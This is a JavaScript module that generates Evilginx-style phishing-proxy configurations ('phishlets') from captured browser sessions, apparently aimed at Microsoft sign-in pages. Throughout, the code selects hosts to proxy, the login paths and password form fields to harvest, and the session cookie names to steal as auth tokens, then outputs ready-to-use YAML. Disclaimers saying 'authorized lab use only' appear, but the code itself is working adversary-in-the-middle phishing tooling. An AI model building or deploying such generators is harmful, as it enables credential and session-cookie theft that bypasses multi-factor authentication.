"use strict";
const { serializeYaml } = require("./yaml");
const { validatePhishlet } = require("./validate");

const DENY_LABELS = /^(graph|admin|monitor|metrics|storage|blob|fpt|copilot)(\.|$)|wcpstatic|uhf|amcdn|office\.net|sharepointonline|cdn\.office|lifecycle\.office|clarity\.ms/i;
const EDGE_SUFFIXES = ["azurefd.net", "azureedge.net", "cloudfront.net", "akamaihd.net", "edgecdn.test", "trafficmanager.net"];
const AUTH_PATH = /(login|password|checkpassword|post\.srf|getcredentialtype|oauth|authorize|saml|credential|account)/i;
const AUTH_URL_PATH = /(login|password|checkpassword|post\.srf|getcredentialtype|oauth|authorize|saml|credential|savestate|silent-signin)/i;
const STATIC_PATH = /\.(?:js|css|png|jpe?g|gif|svg|woff2?|ico)(?:$|\?)/i;
const USERNAME_PRIORITY = ["loginfmt", "login", "user", "username", "usernameentry", "email", "account"];

function registrableDomain(hostname) {
  const host = hostname.toLowerCase().replace(/\.$/, "");
  if (!host || host === "localhost" || /^\d+(?:\.\d+){3}$/.test(host)) return host;
  const labels = host.split(".");
  if (labels.length < 2) return host;
  const multi = ["co.uk", "com.au", "co.jp"].find((suffix) => host.endsWith(`.${suffix}`));
  return labels.slice(-(multi ? 3 : 2)).join(".");
}

function denied(url, includeHosts) {
  const host = url.hostname.toLowerCase();
  if (includeHosts.has(host) || includeHosts.has(registrableDomain(host))) return false;
  if (DENY_LABELS.test(host) || /onecollector/i.test(url.pathname)) return true;
  if (EDGE_SUFFIXES.some((suffix) => host === suffix || host.endsWith(`.${suffix}`))) return true;
  const labels = host.split(".");
  if (labels.some((label) => /^[a-f0-9]{12,}$/i.test(label))) return true;
  return false;
}

function safeUrl(value) {
  try { const url = new URL(value); return /^https?:$/.test(url.protocol) ? url : null; } catch (_) { return null; }
}

function secretScan(node, location = "$", key = "") {
  if (typeof node === "string") {
    if (key === "session_id" && /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(node)) return;
    const jwt = /(?:^|\s)eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}(?:$|\s)/;
    const bearer = /\b(?:bearer|basic)\s+[A-Za-z0-9._~+/=-]{12,}/i;
    const opaque = /^[A-Za-z0-9_-]{40,}$/;
    if (jwt.test(node) || bearer.test(node) || opaque.test(node)) throw new Error(`Secret-looking value rejected at ${location}`);
    return;
  }
  if (Array.isArray(node)) return node.forEach((child, i) => secretScan(child, `${location}[${i}]`, key));
  if (node && typeof node === "object") for (const [childKey, child] of Object.entries(node)) secretScan(child, `${location}.${childKey}`, childKey);
}

function observedHosts(session, includeHosts) {
  const hostMap = new Map();
  for (const event of session.events || []) {
    const url = safeUrl(event.url);
    if (!url || denied(url, includeHosts)) continue;
    const cookieNames = Array.isArray(event.set_cookie_names) ? event.set_cookie_names.filter(Boolean) : [];
    const assetAuth = /(auth|login|msauth|authcdn)/i.test(url.hostname) && STATIC_PATH.test(url.pathname);
    const relevant = cookieNames.length > 0 || AUTH_PATH.test(url.pathname) || assetAuth || includeHosts.has(url.hostname) || includeHosts.has(registrableDomain(url.hostname));
    if (!relevant) continue;
    const domain = registrableDomain(url.hostname);
    if (!domain || domain.split(".").some((label) => /^[a-f0-9]{12,}$/i.test(label))) continue;
    const existing = hostMap.get(url.hostname) || { hostname: url.hostname, domain, cookies: new Set(), authScore: 0, assetOnly: true };
    cookieNames.forEach((name) => existing.cookies.add(String(name)));
    existing.assetOnly = existing.assetOnly && assetAuth && cookieNames.length === 0;
    existing.authScore += cookieNames.length * 3 + (AUTH_PATH.test(url.pathname) ? 2 : 0) + (/^(login|account)\./i.test(url.hostname) ? 4 : 0);
    hostMap.set(url.hostname, existing);
  }
  const grouped = new Map();
  for (const candidate of hostMap.values()) {
    const old = grouped.get(candidate.domain);
    if (!old || candidate.authScore > old.authScore) grouped.set(candidate.domain, candidate);
  }
  return { candidates: [...grouped.values()], raw: hostMap };
}

function findCredentialForm(session) {
  const choices = [];
  for (const event of session.events || []) for (const form of event.form_fields || []) {
    const fields = Array.isArray(form.fields) ? form.fields : [];
    const password = fields.find((field) => String(field.type).toLowerCase() === "password" && !/^codeentry-/i.test(field.name));
    if (!password) continue;
    let username = null;
    for (const wanted of USERNAME_PRIORITY) {
      username = fields.find((field) => String(field.name).toLowerCase() === wanted);
      if (username) break;
    }
    choices.push({ form, event, username, password });
  }
  return choices[0] || null;
}

function loginCandidates(session, credentialForm) {
  const choices = [];
  const add = (urlValue, score) => {
    const url = safeUrl(urlValue);
    if (!url || denied(url, new Set()) || STATIC_PATH.test(url.pathname)) return;
    if (/^\/consumers\/oauth2\/v2\.0\/authorize|^\/consumers\/savestate|^\/auth\/complete-silent-signin|complete-.*-oauth|silent-signin/i.test(url.pathname)) return;
    choices.push({ url, score });
  };
  if (credentialForm) add(credentialForm.form.form_action, 100);
  for (const event of session.events || []) {
    const url = safeUrl(event.url);
    if (!url) continue;
    let score = 0;
    if (/post\.srf/i.test(url.pathname)) score = 95;
    else if (/checkpassword|password/i.test(url.pathname) && String(event.method).toUpperCase() === "POST") score = 90;
    else if (/getcredentialtype/i.test(url.pathname)) score = 80;
    else if (/login/i.test(url.pathname)) score = 70;
    else if (/authorize|oauth/i.test(url.pathname)) score = 40;
    if (score) add(event.url, score);
  }
  return choices.sort((a, b) => b.score - a.score)[0] || null;
}

function generatePhishlet(session, options = {}) {
  if (!session || !Array.isArray(session.events) || !session.events.length) throw new Error("Capture must contain a non-empty events array");
  secretScan(session);
  const includeHosts = new Set((options.includeHosts || []).map((host) => String(host).toLowerCase()));
  const { candidates, raw } = observedHosts(session, includeHosts);
  if (!candidates.length) throw new Error("Capture contains no workable auth-relevant hosts");
  const credentialForm = findCredentialForm(session);
  const loginChoice = loginCandidates(session, credentialForm);
  if (!loginChoice) throw new Error("Capture contains no usable credential/login path");
  const loginDomain = registrableDomain(loginChoice.url.hostname);
  if (!candidates.some((item) => item.domain === loginDomain)) {
    candidates.push({ hostname: loginChoice.url.hostname, domain: loginDomain, cookies: new Set(), authScore: 10, assetOnly: false });
  }
  candidates.sort((a, b) => a.domain.localeCompare(b.domain));
  const proxy_hosts = candidates.map((item) => {
    const suffix = item.hostname === item.domain ? "" : item.hostname.slice(0, -(item.domain.length + 1)).split(".")[0];
    return { phish_sub: suffix, orig_sub: suffix, domain: item.domain, session: !item.assetOnly,
      is_landing: item.domain === loginDomain, auto_filter: true };
  });
  let landed = false;
  for (const item of proxy_hosts) {
    if (item.is_landing && !landed) landed = true;
    else item.is_landing = false;
  }
  const selectedDomains = new Set(proxy_hosts.map((host) => host.domain));
  const tokenMap = new Map();
  for (const host of raw.values()) {
    if (!selectedDomains.has(host.domain) || !host.cookies.size) continue;
    const values = tokenMap.get(host.domain) || new Set();
    host.cookies.forEach((name) => values.add(name));
    tokenMap.set(host.domain, values);
  }
  const auth_tokens = [...tokenMap.entries()].sort().map(([domain, keys]) => ({ domain, keys: [...keys].sort() }));
  const auth_urls = [...new Set((session.events || []).map((event) => safeUrl(event.url))
    .filter((url) => url && selectedDomains.has(registrableDomain(url.hostname)) && AUTH_URL_PATH.test(url.pathname) && !STATIC_PATH.test(url.pathname))
    .map((url) => url.pathname))];
  const credentials = credentialForm ? {
    username: { key: credentialForm.username ? credentialForm.username.name : "login", search: "(.*)", type: "post" },
    password: { key: credentialForm.password.name, search: "(.*)", type: "post" }
  } : {
    username: { key: "login", search: "(.*)", type: "post" },
    password: { key: "passwd", search: "(.*)", type: "post" }
  };
  const sub_filters = proxy_hosts.filter((host) => host.session || host.is_landing).map((host) => ({
    triggers_on: host.orig_sub ? `${host.orig_sub}.${host.domain}` : host.domain,
    orig_sub: host.orig_sub,
    domain: host.domain,
    search: "https://{hostname}/",
    replace: "https://{hostname}/",
    mimes: ["text/html", "application/json", "application/javascript"]
  }));
  const result = { author: String(options.author || "lab-operator"), min_ver: "2.3.0", proxy_hosts, auth_tokens,
    auth_urls, login: { domain: loginDomain, path: loginChoice.url.pathname || "/" }, credentials, sub_filters };
  const validation = validatePhishlet(result);
  if (!validation.valid) throw new Error(`Generated phishlet failed schema validation: ${validation.errors.join("; ")}`);
  return { phishlet: result, coverage: {
    capture: session.coverage || (session.diagnostics && session.diagnostics.coverage) || "unknown",
    credential_keys: credentialForm ? "DOM-evidenced password form" : "heuristic login/passwd; no password form was captured",
    note: "Authorized lab scaffold only; configure phishlet domain/lures and lab-test separately."
  } };
}

function generateYaml(session, options = {}) {
  const generated = generatePhishlet(session, options);
  const header = ["Authorized lab use only — synthetic/sanitized metadata; never use against unauthorized targets.",
    `Coverage: ${generated.coverage.capture}; credential keys: ${generated.coverage.credential_keys}`,
    generated.coverage.note];
  const yaml = serializeYaml(generated.phishlet, header);
  if (yaml.includes("{{PLACEHOLDER}}")) throw new Error("Placeholder token reached generated YAML");
  return { yaml, ...generated };
}

module.exports = { registrableDomain, denied, secretScan, observedHosts, findCredentialForm, generatePhishlet, generateYaml };
